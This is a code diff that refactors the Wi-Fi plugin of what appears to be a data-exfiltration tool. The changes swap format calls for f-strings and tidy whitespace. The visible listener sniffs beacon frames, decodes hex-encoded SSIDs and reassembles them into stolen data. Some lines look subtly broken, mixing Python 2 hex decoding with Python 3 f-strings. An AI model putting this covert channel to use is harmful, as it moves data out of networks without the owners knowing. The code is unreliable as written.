@@ -12,22 +12,22 @@ ap_buffer = []
 job_id = None
 
 def PacketHandler(pkt):
-    global ap_buffer, job_id 
+    global ap_buffer, job_id
     if pkt.haslayer(Dot11):
         if pkt.type == 00 and pkt.subtype == 8:
             if pkt.addr2 not in ap_list:
                 ap_list.append(pkt.addr2)
-                print("AP MAC: {} with SSID: {}".format(pkt.addr2, pkt.info))
+                print(f"AP MAC: {pkt.addr2} with SSID: {pkt.info}")
                 try:
                     data = pkt.info.decode('hex')
                     if len(ap_buffer) == 0:
                         job_id = data[:7]
-                    print("job_id : {}".format(job_id))
+                    print(f"job_id : {job_id}")
                     ap_buffer.append(data)
                     print(ap_buffer)
                     try:
                         data_to_exfil = ''.join(ap_buffer)
-                        print("data_to_exfil = {}".format(data_to_exfil))
+                        print(f"data_to_exfil = {data_to_exfil}")
                         if len(pkt.info) < 30:
                             data_to_exfil = ''.join(ap_buffer)
                             app_exfiltrate.retrieve_data(data_to_exfil)
@@ -38,10 +38,8 @@ def PacketHandler(pkt):
                             ap_buffer = data_to_exfil.split(packet_exfil, '')
                     except Exception as err:
                         print(err)
-                        pass
                 except Exception as err:
                     print(err)
-                    pass
 
 def send(data):
     # data = data.encode('hex')
@@ -74,7 +72,9 @@ def send(data):
 
 def listen():
     print(config['interface'])
-    app_exfiltrate.log_message('info', "[wifi] Waiting for Wi-Fi probe on {}".format(config['interface']))
+    app_exfiltrate.log_message(
+        'info', f"[wifi] Waiting for Wi-Fi probe on {config['interface']}"
+    )
     sniff(iface=str(config['interface']), prn=PacketHandler)    
     # sniff(iface="wlan1mon", prn=PacketHandler)
 
